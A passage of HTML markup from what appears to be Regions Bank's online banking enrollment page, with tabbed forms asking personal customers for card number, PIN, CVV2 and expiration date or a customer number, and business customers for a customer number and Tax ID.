type="button" data-tabname="TabChecking" class="selector" role="tab" aria-selected="false" aria-owns="uodbuos" id="fkrrraj">Checking or Savings</button></li><li role="presentation"><button tabindex="-1" type="button" data-tabname="TabOther" class="selector" role="tab" aria-selected="false" aria-owns="rwhbjby" id="wirspki">Other Regions Accounts Only</button></li></ul></nav></div><div data-tabname="TabChecking" class="content" tabindex="-1" role="tabpanel" id="uodbuos" aria-hidden="false" aria-labelledby="fkrrraj nosikpd"><h4>Choose a method to verify your personal accounts:&nbsp;&nbsp;</h4><section class="tabheader tabheader-noborder"><div class="navwrapper"><nav class="tabbuttons"><ul role="tablist" aria-labelledby="[object Object]"><li role="presentation"><button tabindex="0" type="button" data-tabname="TabAtm" class="selector" role="tab" aria-selected="false" aria-owns="mhvacim" id="fcxqhmb">ATM/CheckCard Number</button></li><li role="presentation"><button tabindex="-1" type="button" data-tabname="TabCustomerNo" class="selector" role="tab" aria-selected="false" aria-owns="jvvuqxj" id="knfenup">Customer Number    <span class="popup-help-link ui-flyout-activator ui-flyout-closed" tabindex="0" role="button" aria-expanded="false" aria-describedby="flyout-2"></span>
<section class="fly-out hover-flyout" data-fly-out-direction="right" data-fly-out-arrow="true" data-fly-out-activateon="hover" id="flyout-2">    <div class="popup-help-content">
        <h1>What is my customer number?</h1>
        <p>This number is provided at account opening. Don't have this number? Call 1-800-240-7887.
Business customers please contact your Business Banker or branch for assistance.</p>
    </div>
</section></button></li></ul></nav></div><div data-tabname="TabAtm" class="content" tabindex="-1" role="tabpanel" id="mhvacim" aria-hidden="false" aria-labelledby="fcxqhmb fvtfqpq">    <h4 class="atmcheckcard-header">Enter your ATM/CheckCard number:</h4>
    <div class="info-verification-atm sub-content" data-atmreloadablecardlabel="Card Number">
        <fieldset>
            <legend class="visually-hidden">ATM Card Identification</legend>
            <ol>
                <li>
                    <label for="PersonalCheckAtmCardNum1" class="regions-label first">ATM/CheckCard Number<abbr class="required-field" title="Required">*</abbr></label>
                    <a title="Popup help" class="popup-help-link ui-flyout-activator ui-flyout-closed" tabindex="0" role="button" aria-expanded="false" aria-controls="flyout-3"><span class="visually-hidden">Popup help</span></a><section class="fly-out hover-flyout" data-fly-out-exclusive="true" data-fly-out-arrow="true" id="flyout-3"><div class="popup-help-content">The 16 digit number printed on your ATM/CheckCard.<a title="Cancel" class="cancel"><span class="visually-hidden">Cancel</span></a></div></section>
                    <input aria-required="True" autocomplete="off" class="check-card1" data-val="true" data-val-creditcardmodcheck="Card Number is not a valid number." data-val-regex="&amp;#39;Card Number&amp;#39; is not in the correct format." data-val-regex-pattern="(\D*\d){16}|(_{4}-_{4}-_{4}-_{4})$" data-val-required="&amp;#39;Card Number&amp;#39; should not be empty." id="PersonalCheckAtmCardNum1" maxlength="38" name="AtmCardNum1" required="required" style="width:164px;" type="text" value="">
                    <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="AtmCardNum1" data-valmsg-replace="true"></span>
                </li>
                <li>
                    <label for="PersonalCheckAtmPin" class="regions-label first">PIN<abbr class="required-field" title="Required">*</abbr></label>
                    <a title="Popup help" class="popup-help-link ui-flyout-activator ui-flyout-closed" tabindex="0" role="button" aria-expanded="false" aria-controls="flyout-4"><span class="visually-hidden">Popup help</span></a><section class="fly-out hover-flyout" data-fly-out-exclusive="true" data-fly-out-arrow="true" id="flyout-4"><div class="popup-help-content">Your PIN is a 4-digit number used for ATM withdrawals or point-of-sale debit purchases.<a title="Cancel" class="cancel"><span class="visually-hidden">Cancel</span></a></div></section>
                    <input aria-required="True" autocomplete="off" class="atm-pin" data-val="true" data-val-atmpinnotempty="Property Atm Pin is invalid." data-val-length="&amp;#39;Atm Pin&amp;#39; must be 4 characters in length." data-val-length-max="4" data-val-length-min="4" data-val-regex="ATM PIN is invalid." data-val-regex-pattern="[0-9]*" data-val-required="&amp;#39;Atm Pin&amp;#39; should not be empty." id="PersonalCheckAtmPin" maxlength="8" name="AtmPin" required="required" style="width:50px;" type="password" value="">
                    <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="AtmPin" data-valmsg-replace="true"></span>
                </li>
            </ol>
            <ol>
                <li class="cv2-display">
                    <label for="PersonalCheckCardSecurityCode" class="regions-label first">CVV2<abbr class="required-field" title="Required">*</abbr></label>
                    <a title="Popup help" class="popup-help-link ui-flyout-activator ui-flyout-closed" tabindex="0" role="button" aria-expanded="false" aria-controls="flyout-5"><span class="visually-hidden">Popup help</span></a><section class="fly-out hover-flyout" data-fly-out-exclusive="true" data-fly-out-arrow="true" id="flyout-5"><div class="popup-help-content"><h1>What is my CVV number?</h1>    <div class="cvv-helper"></div>
<a title="Cancel" class="cancel"><span class="visually-hidden">Cancel</span></a></div></section>
                    <input aria-required="True" autocomplete="off" class="cardsecurity-code" data-val="true" data-val-cardsecuritycodenotempty="Property Card Security Code is invalid." data-val-length="&amp;#39;Card Security Code&amp;#39; must be 3 characters in length." data-val-length-max="3" data-val-length-min="3" data-val-regex="Card Security Code is invalid." data-val-regex-pattern="[0-9]*" data-val-required="&amp;#39;Card Security Code&amp;#39; should not be empty." id="PersonalCheckCardSecurityCode" maxlength="6" name="CardSecurityCode" required="required" style="width:30px;" type="text" value="">
                    <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="CardSecurityCode" data-valmsg-replace="true"></span>
                </li>
                <li>
                    <label for="PersonalCheckExpirationDate" class="regions-label first">Expiration Date<abbr class="required-field" title="Required">*</abbr></label>
                    <a title="Popup help" class="popup-help-link ui-flyout-activator ui-flyout-closed" tabindex="0" role="button" aria-expanded="false" aria-controls="flyout-6"><span class="visually-hidden">Popup help</span></a><section class="fly-out hover-flyout" data-fly-out-exclusive="true" data-fly-out-arrow="true" id="flyout-6"><div class="popup-help-content">Enter MMYY displayed on card.<a title="Cancel" class="cancel"><span class="visually-hidden">Cancel</span></a></div></section>
                    <input aria-required="True" autocomplete="off" class="expiration-date" data-val="true" data-val-expirationdatenotempty="Expiration Date should not be empty" data-val-regex="&amp;#39;Expiration Date&amp;#39; is not in the correct format." data-val-regex-pattern="((1[0-2]|0[1-9])\/([0-9]\d))|(_{2}/_{2})$" data-val-required="&amp;#39;Expiration Date&amp;#39; should not be empty." id="PersonalCheckExpirationDate" maxlength="10" name="ExpirationDate" required="required" style="width:40px;" type="text" value="">
                    <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="ExpirationDate" data-valmsg-replace="true"></span>
                </li>
            </ol>
        </fieldset>
    </div>
</div><div data-tabname="TabCustomerNo" class="content" tabindex="-1" role="tabpanel" id="jvvuqxj" aria-hidden="false" aria-labelledby="knfenup jpeuwbp">    <h4 class="nonnra-info">Enter your Customer Number:</h4>
    <h4 class="nra-info" style="display: none">Enter your Personal Customer Number and Personal Regions Account Number:</h4>
    <div class="enroll-customernumber sub-content">
        <label for="PersonalCustomerNumber" style="padding-left:35px;" class="regions-label first">Customer Number<abbr class="required-field" title="Required">*</abbr></label>
        <span class="nra-information" style="display: none"><a title="Popup help" class="popup-help-link ui-flyout-activator ui-flyout-closed" tabindex="0" role="button" aria-expanded="false" aria-controls="flyout-7"><span class="visually-hidden">Popup help</span></a><section class="fly-out hover-flyout" data-fly-out-exclusive="true" data-fly-out-arrow="true" id="flyout-7"><div class="popup-help-content"><h1>What is my customer number?</h1>This number is provided at account opening. Don't have this number? Call 1-800-240-7887.
Business customers please contact your Business Banker or branch for assistance.<a title="Cancel" class="cancel"><span class="visually-hidden">Cancel</span></a></div></section></span>
        <input aria-required="True" autocomplete="off" class="customernumber" data-val="true" data-val-regex="&amp;#39;Customer Number&amp;#39; is not in the correct format." data-val-regex-pattern="[0-9]*" data-val-required="Customer number should not be empty." id="PersonalCustomerNumber1" maxlength="40" name="CustomerNumber" required="required" style="width:188px;" type="text" value="">
        <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="CustomerNumber" data-valmsg-replace="true"></span>
    </div>
    <div class="nra-information" style="display: none">
        <label for="NraAccountNumber" style="padding-left:35px;" class="regions-label first">Regions Account Number<abbr class="required-field" title="Required">*</abbr></label>
        <a title="Popup help" class="popup-help-link ui-flyout-activator ui-flyout-closed" tabindex="0" role="button" aria-expanded="false" aria-controls="flyout-8"><span class="visually-hidden">Popup help</span></a><section class="fly-out hover-flyout" data-fly-out-exclusive="true" data-fly-out-arrow="true" id="flyout-8"><div class="popup-help-content">Enter your checking, savings or money market account number.<a title="Cancel" class="cancel"><span class="visually-hidden">Cancel</span></a></div></section>
        <input aria-required="true" class="nraaccount-number" data-val="true" data-val-regex="&amp;#39;Nra Account Number&amp;#39; is not in the correct format." data-val-regex-pattern="[0-9]*" data-val-required="Account number should not be empty." id="NraAccountNumber1" maxlength="40" name="NraAccountNumber" required="required" style="width: 188px;" type="text" value="">
        <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="NraAccountNumber" data-valmsg-replace="true"></span>
    </div>
</div></section></div><div data-tabname="TabOther" class="content" tabindex="-1" role="tabpanel" id="rwhbjby" aria-hidden="false" aria-labelledby="wirspki jjvxhsq">    <h4>
        Select your account type from the list below:
        <a href="javascript:void(0)" class="other-morethanoneaccount ui-flyout-activator ui-flyout-closed" tabindex="0" aria-expanded="false" aria-describedby="flyout-9">
            What if you have more than one Regions account?
        </a>
        <section class="fly-out hover-flyout" data-fly-out-direction="up" data-fly-out-arrow="true" data-fly-out-activateon="hover" id="flyout-9">        <span><meta alias="ENROLLMENT-Help-MoreThanOneRegionsAccount-PrsnlBiz"><p>
You may enter information for any of the account types in the list. You will need your account number and an additional piece of information related to the account type you select.

</p></span></section>
    </h4>
    <div class="otheraccount-identification-section sub-content">
        <fieldset>
            <legend class="visually-hidden">Other Account Identification</legend>
            <ol class="other-account-type">
                <li>
                    
                    <label for="PersonalAccountTypeOther" class="regions-label first">Account Type<abbr class="required-field" title="Required">*</abbr></label>
                    <a title="Popup help" class="popup-help-link ui-flyout-activator ui-flyout-closed" tabindex="0" role="button" aria-expanded="false" aria-controls="flyout-10"><span class="visually-hidden">Popup help</span></a><section class="fly-out hover-flyout" data-fly-out-exclusive="true" data-fly-out-arrow="true" id="flyout-10"><div class="popup-help-content">Account type can be any one of the following that you have with Regions: Installment Loan, CD, IRA, Credit Card, Equity Line or Reloadable Card.<a title="Cancel" class="cancel"><span class="visually-hidden">Cancel</span></a></div></section>
                    <select aria-required="True" class="account-type-other" id="PersonalAccountTypeOther" name="AccountTypeOther" required="required"><option value="">Select account type</option>
<option value="installmentloan">Installment Loan</option>
<option value="timedeposit">CD or IRA</option>
<option value="creditcard">Credit Card</option>
<option value="equityline">Equity Line</option>
<option value="gpr">Reloadable Card</option>
</select>
                </li>
                <li class="othertab-items" style="display: none">
                    <label for="PersonalRegionsAccountNumber" class="regions-label first">Regions account number<abbr class="required-field" title="Required">*</abbr></label>
                    <input aria-required="True" autocomplete="off" class="regions-acctnumber" data-val="true" data-val-creditcardmodcheck="Credit card number is invalid." data-val-regex="Regions AccountNumber Invalid format." data-val-regex-pattern="[0-9]*" data-val-required="&amp;#39;Regions Account Number&amp;#39; should not be empty." id="PersonalRegionsAccountNumber" maxlength="40" name="RegionsAccountNumber" required="required" style="width:188px;" type="text" value="">
                    <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="RegionsAccountNumber" data-valmsg-replace="true"></span>
                </li>
                <li class="othertab-items" style="display: none">
                    
                        
                            <label for="AuthenticationAmount" class="regions-label first authentication-info-label">Authentication info<abbr class="required-field" title="Required">*</abbr></label>
                            <input aria-required="True" autocomplete="off" class="authentication-amount per-authenticationamount" data-val="true" data-val-authenticationamountnotempty="Amount is empty" id="AuthenticationAmount" name="AuthenticationAmount" required="required" type="text" value="0">
                            <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="AuthenticationAmount" data-valmsg-replace="true"></span>
                        
                </li>
            </ol>
        </fieldset>
        <ol class="other-reloadable-card" style="display:none">
            <li>
                    <h4 class="atmcheckcard-header">Enter your ATM/CheckCard number:</h4>
    <div class="info-verification-atm sub-content" data-atmreloadablecardlabel="Card Number">
        <fieldset>
            <legend class="visually-hidden">ATM Card Identification</legend>
            <ol>
                <li>
                    <label for="PersonalAtmCardNum1" class="regions-label first">ATM/CheckCard Number<abbr class="required-field" title="Required">*</abbr></label>
                    <a title="Popup help" class="popup-help-link ui-flyout-activator ui-flyout-closed" tabindex="0" role="button" aria-expanded="false" aria-controls="flyout-11"><span class="visually-hidden">Popup help</span></a><section class="fly-out hover-flyout" data-fly-out-exclusive="true" data-fly-out-arrow="true" id="flyout-11"><div class="popup-help-content">The 16 digit number printed on your ATM/CheckCard.<a title="Cancel" class="cancel"><span class="visually-hidden">Cancel</span></a></div></section>
                    <input aria-required="True" autocomplete="off" class="check-card1" id="PersonalAtmCardNum1" maxlength="38" name="AtmCardNum1" required="required" style="width:164px;" type="text" value="">
                    <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="AtmCardNum1" data-valmsg-replace="true"></span>
                </li>
                <li>
                    <label for="PersonalAtmPin" class="regions-label first">PIN<abbr class="required-field" title="Required">*</abbr></label>
                    <a title="Popup help" class="popup-help-link ui-flyout-activator ui-flyout-closed" tabindex="0" role="button" aria-expanded="false" aria-controls="flyout-12"><span class="visually-hidden">Popup help</span></a><section class="fly-out hover-flyout" data-fly-out-exclusive="true" data-fly-out-arrow="true" id="flyout-12"><div class="popup-help-content">Your PIN is a 4-digit number used for ATM withdrawals or point-of-sale debit purchases.<a title="Cancel" class="cancel"><span class="visually-hidden">Cancel</span></a></div></section>
                    <input aria-required="True" autocomplete="off" class="atm-pin" id="PersonalAtmPin" maxlength="8" name="AtmPin" required="required" style="width:50px;" type="password" value="">
                    <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="AtmPin" data-valmsg-replace="true"></span>
                </li>
            </ol>
            <ol>
                <li class="cv2-display">
                    <label for="PersonalCardSecurityCode" class="regions-label first">CVV2<abbr class="required-field" title="Required">*</abbr></label>
                    <a title="Popup help" class="popup-help-link ui-flyout-activator ui-flyout-closed" tabindex="0" role="button" aria-expanded="false" aria-controls="flyout-13"><span class="visually-hidden">Popup help</span></a><section class="fly-out hover-flyout" data-fly-out-exclusive="true" data-fly-out-arrow="true" id="flyout-13"><div class="popup-help-content"><h1>What is my CVV number?</h1>    <div class="cvv-helper"></div>
<a title="Cancel" class="cancel"><span class="visually-hidden">Cancel</span></a></div></section>
                    <input aria-required="True" autocomplete="off" class="cardsecurity-code" id="PersonalCardSecurityCode" maxlength="6" name="CardSecurityCode" required="required" style="width:30px;" type="text" value="">
                    <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="CardSecurityCode" data-valmsg-replace="true"></span>
                </li>
                <li>
                    <label for="PersonalExpirationDate" class="regions-label first">Expiration Date<abbr class="required-field" title="Required">*</abbr></label>
                    <a title="Popup help" class="popup-help-link ui-flyout-activator ui-flyout-closed" tabindex="0" role="button" aria-expanded="false" aria-controls="flyout-14"><span class="visually-hidden">Popup help</span></a><section class="fly-out hover-flyout" data-fly-out-exclusive="true" data-fly-out-arrow="true" id="flyout-14"><div class="popup-help-content">Enter MMYY displayed on card.<a title="Cancel" class="cancel"><span class="visually-hidden">Cancel</span></a></div></section>
                    <input aria-required="True" autocomplete="off" class="expiration-date" id="PersonalExpirationDate" maxlength="10" name="ExpirationDate" required="required" style="width:40px;" type="text" value="">
                    <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="ExpirationDate" data-valmsg-replace="true"></span>
                </li>
            </ol>
        </fieldset>
    </div>

            </li>
        </ol>
    </div>
</div></section>    <div class="nra-information nra-form" style="display: none;">
            <h4 class="nonnra-info">Enter your Customer Number:</h4>
    <h4 class="nra-info" style="display: none">Enter your Personal Customer Number and Personal Regions Account Number:</h4>
    <div class="enroll-customernumber sub-content">
        <label for="PersonalCustomerNumber" style="padding-left:35px;" class="regions-label first">Customer Number<abbr class="required-field" title="Required">*</abbr></label>
        <span class="nra-information" style="display: none"><a title="Popup help" class="popup-help-link ui-flyout-activator ui-flyout-closed" tabindex="0" role="button" aria-expanded="false" aria-controls="flyout-15"><span class="visually-hidden">Popup help</span></a><section class="fly-out hover-flyout" data-fly-out-exclusive="true" data-fly-out-arrow="true" id="flyout-15"><div class="popup-help-content"><h1>What is my customer number?</h1>This number is provided at account opening. Don't have this number? Call 1-800-240-7887.
Business customers please contact your Business Banker or branch for assistance.<a title="Cancel" class="cancel"><span class="visually-hidden">Cancel</span></a></div></section></span>
        <input aria-required="True" autocomplete="off" class="customernumber" id="PersonalCustomerNumber" maxlength="40" name="CustomerNumber" required="required" style="width:188px;" type="text" value="">
        <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="CustomerNumber" data-valmsg-replace="true"></span>
    </div>
    <div class="nra-information" style="display: none">
        <label for="NraAccountNumber" style="padding-left:35px;" class="regions-label first">Regions Account Number<abbr class="required-field" title="Required">*</abbr></label>
        <a title="Popup help" class="popup-help-link ui-flyout-activator ui-flyout-closed" tabindex="0" role="button" aria-expanded="false" aria-controls="flyout-16"><span class="visually-hidden">Popup help</span></a><section class="fly-out hover-flyout" data-fly-out-exclusive="true" data-fly-out-arrow="true" id="flyout-16"><div class="popup-help-content">Enter your checking, savings or money market account number.<a title="Cancel" class="cancel"><span class="visually-hidden">Cancel</span></a></div></section>
        <input aria-required="true" class="nraaccount-number" id="NraAccountNumber2" maxlength="40" name="NraAccountNumber" required="required" style="width: 188px;" type="text" value="">
        <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="NraAccountNumber" data-valmsg-replace="true"></span>
    </div>

    </div>
</div><div data-tabname="Business" class="content" tabindex="-1" role="tabpanel" id="idstcgq" aria-hidden="false" aria-labelledby="xjifivh">    <h4>
        Enter the following information for business verification:&nbsp;&nbsp;
        <a href="javascript:void(0)" class="bankingtype-morethan-onebusiness ui-flyout-activator ui-flyout-closed" tabindex="0" aria-expanded="false" aria-describedby="flyout-17">
            What if I have more than one business?
        </a>
        <section class="fly-out hover-flyout" data-fly-out-direction="up" data-fly-out-arrow="true" data-fly-out-activateon="hover" id="flyout-17"><span><meta alias="ENROLLMENT-Help-MoreThanOneBusiness"><p>

Additional businesses may be enrolled and accessed with the same Online ID and Password.<br>
<br>

The Tax ID number and Customer Number for each business will be entered in a subsequent step.

</p></span></section>
    </h4>
    <div class="business-banking-section sub-content">
        
<fieldset>
    <ol>
        <li>
            <label for="BusinessCustomerNumber" class="regions-label first">Customer Number<abbr class="required-field" title="Required">*</abbr></label>
            <a title="Popup help" class="popup-help-link ui-flyout-activator ui-flyout-closed" tabindex="0" role="button" aria-expanded="false" aria-controls="flyout-18"><span class="visually-hidden">Popup help</span></a><section class="fly-out hover-flyout" data-fly-out-exclusive="true" data-fly-out-arrow="true" id="flyout-18"><div class="popup-help-content"><h1>What is my customer number?</h1>This number is provided at account opening. Don't have this number? Call 1-800-240-7887.
Business customers please contact your Business Banker or branch for assistance.<a title="Cancel" class="cancel"><span class="visually-hidden">Cancel</span></a></div></section>
            <input class="business-customernumber" data-val="true" data-val-regex="&amp;#39;CustomerNumber&amp;#39; is not in the correct format." data-val-regex-pattern="[0-9]*" data-val-required="&amp;#39;CustomerNumber&amp;#39; should not be empty." id="BusinessCustomerNumber" maxlength="40" name="BusinessCustomerNumber" style="width:190px;" type="text" value="">
            <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="BusinessCustomerNumber" data-valmsg-replace="true"></span>
        </li>
        <li>
            <label for="TIN1" class="regions-label first">Tax Identification Number (TIN)<abbr class="required-field" title="Required">*</abbr></label>
            <a title="Popup help" class="popup-help-link ui-flyout-activator ui-flyout-closed" tabindex="0" role="button" aria-expanded="false" aria-controls="flyout-19"><span class="visually-hidden">Popup help</span></a><section class="fly-out hover-flyout" data-fly-out-exclusive="true" data-fly-out-arrow="true" id="flyout-19"><div class="popup-help-content">Your Tax Identification Number is the unique 9 digit number associated with your business for tax purposes and was used to open your account.<a title="Cancel" class="cancel"><span class="visually-hidden">Cancel</span></a></div></section>
            <input class="tin-1" data-val="true" data-val-length="&amp;#39;TIN&amp;#39; must be 9 characters in length." data-val-length-max="9" data-val-length-min="9" data-val-regex="&amp;#39;TIN&amp;#39; is not in the correct format." data-val-regex-pattern="[0-9]*" data-val-required="&amp;#39;TIN&amp;#39; should not be empty." id="TIN1" maxlength="18" name="TIN1" style="width:85px;" type="text" value="">
            <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="TIN1" data-valmsg-replace="true"></span>
        </li>
        <li class="nra-information" style="display: none">
            <label for="NraAccountNumber" class="regions-label first">Regions Account Number<abbr class="required-field" title="Required">*</abbr></label>
            <a title="Popup help" class="popup-help-link ui-flyout-activator ui-flyout-closed" tabindex="0" role="button" aria-expanded="false" aria-controls="flyout-20"><span class="visually-hidden">Popup help</span></a><section class="fly-out hover-flyout" data-fly-out-exclusive="true" data-fly-out-arrow="true" id="flyout-20"><div class="popup-help-content">Enter your checking, savings or money market account number.<a title="Cancel" class="cancel"><span class="visually-hidden">Cancel</span></a></div></section>
            <input aria-required="true" class="nraaccount-number" id="NraAccountNumber3" maxlength="40" name="NraAccountNumber" required="required" style="width: 130px;" type="text" value="">
            <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="NraAccountNumber" data-valmsg-replace="true"></span>
        </li>
    </ol>
</fieldset>
    

        <a href="javascript:void(0)" class="bankingtype-open-withssn ui-flyout-activator ui-flyout-closed" style="margin-left:35px;" tabindex="0" aria-expanded="false" aria-describedby="flyout-21">
            What if I used my Social Security Number (SSN) to open my business account?
        </a>
        <section class="fly-out hover-flyout" data-fly-out-direction="up" data-fly-out-arrow="true" data-fly-out-activateon="hover" id="flyout-21"><p><meta alias="ENROLLMENT-Help-OpenedWithSSN">Enter the Social Security Number used to open the account if a Tax ID Number has not been established for the business.</p></section>
    </div>
</div><div data-tabname="PersonalBusiness" class="content" tabindex="-1" role="tabpanel" id="hpxigti" aria-hidden="false" aria-labelledby="vrrjglk"><section class="tabheader tabheader-noborder checkingother-tabcontainer prospect-information">    <h4 id="jadswoa">Which personal account(s) do you have with Regions? Select one:</h4><div class="navwrapper"><nav class="tabbuttons"><ul role="tablist" aria-labelledby="jadswoa"><li role="presentation"><button tabindex="0" type="button" data-tabname="TabChecking" class="selector" role="tab" aria-selected="false" aria-owns="uodbuos" id="nosikpd">Checking or Savings</button></li><li role="presentation"><button tabindex="-1" type="button" data-tabname="TabOther" class="selector" role="tab" aria-selected="false" aria-owns="rwhbjby" id="jjvxhsq">Other Regions Accounts Only</button></li></ul></nav></div><div data-tabname="TabChecking" class="content"><h4>Choose a method to verify your personal accounts:&nbsp;&nbsp;<a href="javascript:void(0)" tabindex="0" aria-expanded="false" aria-describedby="flyout-22" class="ui-flyout-activator ui-flyout-closed">How do I enroll my business account(s)?</a><section class="fly-out hover-flyout" data-fly-out-direction="up" data-fly-out-arrow="true" data-fly-out-activateon="hover" id="flyout-22"><p>Additional steps in this process will allow <br>you to add additional business account(s) or <br>you can use the Customer Service Center <br> in Online Banking once enrolled.</p></section></h4><section class="tabheader tabheader-noborder"><div class="navwrapper"><nav class="tabbuttons"><ul role="tablist" aria-labelledby="[object Object]"><li role="presentation"><button tabindex="0" type="button" data-tabname="TabAtm" class="selector" role="tab" aria-selected="false" aria-owns="mhvacim" id="fvtfqpq">ATM/CheckCard Number</button></li><li role="presentation"><button tabindex="-1" type="button" data-tabname="TabCustomerNo" class="selector" role="tab" aria-selected="false" aria-owns="jvvuqxj" id="jpeuwbp">Customer Number    <span class="popup-help-link ui-flyout-activator ui-flyout-closed" tabindex="0" role="button" aria-expanded="false" aria-describedby="flyout-23"></span>
<section class="fly-out hover-flyout" data-fly-out-direction="right" data-fly-out-arrow="true" data-fly-out-activateon="hover" id="flyout-23">    <div class="popup-help-content">
        <h1>What is my customer number?</h1>
        <p>This number is provided at account opening. Don't have this number? Call 1-800-240-7887.
Business customers please contact your Business Banker or branch for assistance.</p>
    </div>
</section></button></li></ul></nav></div><div data-tabname="TabAtm" class="content">    <h4 class="atmcheckcard-header">Enter your ATM/CheckCard number:</h4>
    <div class="info-verification-atm sub-content" data-atmreloadablecardlabel="Card Number">
        <fieldset>
            <legend class="visually-hidden">ATM Card Identification</legend>
            <ol>
                <li>
                    <label for="MixedCheckAtmCardNum1" class="regions-label first">ATM/CheckCard Number<abbr class="required-field" title="Required">*</abbr></label>
                    <a title="Popup help" class="popup-help-link ui-flyout-activator ui-flyout-closed" tabindex="0" role="button" aria-expanded="false" aria-controls="flyout-24"><span class="visually-hidden">Popup help</span></a><section class="fly-out hover-flyout" data-fly-out-exclusive="true" data-fly-out-arrow="true" id="flyout-24"><div class="popup-help-content">The 16 digit number printed on your ATM/CheckCard.<a title="Cancel" class="cancel"><span class="visually-hidden">Cancel</span></a></div></section>
                    <input aria-required="True" autocomplete="off" class="check-card1" id="MixedCheckAtmCardNum1" maxlength="38" name="AtmCardNum1" required="required" style="width:164px;" type="text" value="">
                    <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="AtmCardNum1" data-valmsg-replace="true"></span>
                </li>
                <li>
                    <label for="MixedCheckAtmPin" class="regions-label first">PIN<abbr class="required-field" title="Required">*</abbr></label>
                    <a title="Popup help" class="popup-help-link ui-flyout-activator ui-flyout-closed" tabindex="0" role="button" aria-expanded="false" aria-controls="flyout-25"><span class="visually-hidden">Popup help</span></a><section class="fly-out hover-flyout" data-fly-out-exclusive="true" data-fly-out-arrow="true" id="flyout-25"><div class="popup-help-content">Your PIN is a 4-digit number used for ATM withdrawals or point-of-sale debit purchases.<a title="Cancel" class="cancel"><span class="visually-hidden">Cancel</span></a></div></section>
                    <input aria-required="True" autocomplete="off" class="atm-pin" id="MixedCheckAtmPin" maxlength="8" name="AtmPin" required="required" style="width:50px;" type="password" value="">
                    <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="AtmPin" data-valmsg-replace="true"></span>
                </li>
            </ol>
            <ol>
                <li class="cv2-display">
                    <label for="MixedCheckCardSecurityCode" class="regions-label first">CVV2<abbr class="required-field" title="Required">*</abbr></label>
                    <a title="Popup help" class="popup-help-link ui-flyout-activator ui-flyout-closed" tabindex="0" role="button" aria-expanded="false" aria-controls="flyout-26"><span class="visually-hidden">Popup help</span></a><section class="fly-out hover-flyout" data-fly-out-exclusive="true" data-fly-out-arrow="true" id="flyout-26"><div class="popup-help-content"><h1>What is my CVV number?</h1>    <div class="cvv-helper"></div>
<a title="Cancel" class="cancel"><span class="visually-hidden">Cancel</span></a></div></section>
                    <input aria-required="True" autocomplete="off" class="cardsecurity-code" id="MixedCheckCardSecurityCode" maxlength="6" name="CardSecurityCode" required="required" style="width:30px;" type="text" value="">
                    <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="CardSecurityCode" data-valmsg-replace="true"></span>
                </li>
                <li>
                    <label for="MixedCheckExpirationDate" class="regions-label first">Expiration Date<abbr class="required-field" title="Required">*</abbr></label>
                    <a title="Popup help" class="popup-help-link ui-flyout-activator ui-flyout-closed" tabindex="0" role="button" aria-expanded="false" aria-controls="flyout-27"><span class="visually-hidden">Popup help</span></a><section class="fly-out hover-flyout" data-fly-out-exclusive="true" data-fly-out-arrow="true" id="flyout-27"><div class="popup-help-content">Enter MMYY displayed on card.<a title="Cancel" class="cancel"><span class="visually-hidden">Cancel</span></a></div></section>
                    <input aria-required="True" autocomplete="off" class="expiration-date" id="MixedCheckExpirationDate" maxlength="10" name="ExpirationDate" required="required" style="width:40px;" type="text" value="">
                    <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="ExpirationDate" data-valmsg-replace="true"></span>
                </li>
            </ol>
        </fieldset>
    </div>
</div><div data-tabname="TabCustomerNo" class="content">    <h4 class="nonnra-info">Enter your Customer Number:</h4>
    <h4 class="nra-info" style="display: none">Enter your Personal Customer Number and Personal Regions Account Number:</h4>
    <div class="enroll-customernumber sub-content">
        <label for="MixedCustomerNumber" style="padding-left:35px;" class="regions-label first">Customer Number<abbr class="required-field" title="Required">*</abbr></label>
        <span class="nra-information" style="display: none"><a title="Popup help" class="popup-help-link ui-flyout-activator ui-flyout-closed" tabindex="0" role="button" aria-expanded="false" aria-controls="flyout-28"><span class="visually-hidden">Popup help</span></a><section class="fly-out hover-flyout" data-fly-out-exclusive="true" data-fly-out-arrow="true" id="flyout-28"><div class="popup-help-content"><h1>What is my customer number?</h1>This number is provided at account opening. Don't have this number? Call 1-800-240-7887.
Business customers please contact your Business Banker or branch for assistance.<a title="Cancel" class="cancel"><span class="visually-hidden">Cancel</span></a></div></section></span>
        <input aria-required="True" autocomplete="off" class="customernumber" id="MixedCustomerNumber1" maxlength="40" name="CustomerNumber" required="required" style="width:188px;" type="text" value="">
        <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="CustomerNumber" data-valmsg-replace="true"></span>
    </div>
    <div class="nra-information" style="display: none">
        <label for="NraAccountNumber" style="padding-left:35px;" class="regions-label first">Regions Account Number<abbr class="required-field" title="Required">*</abbr></label>
        <a title="Popup help" class="popup-help-link ui-flyout-activator ui-flyout-closed" tabindex="0" role="button" aria-expanded="false" aria-controls="flyout-29"><span class="visually-hidden">Popup help</span></a><section class="fly-out hover-flyout" data-fly-out-exclusive="true" data-fly-out-arrow="true" id="flyout-29"><div class="popup-help-content">Enter your checking, savings or money market account number.<a title="Cancel" class="cancel"><span class="visually-hidden">Cancel</span></a></div></section>
        <input aria-required="true" class="nraaccount-number" id="NraAccountNumber4" maxlength="40" name="NraAccountNumber" required="required" style="width: 188px;" type="text" value="">
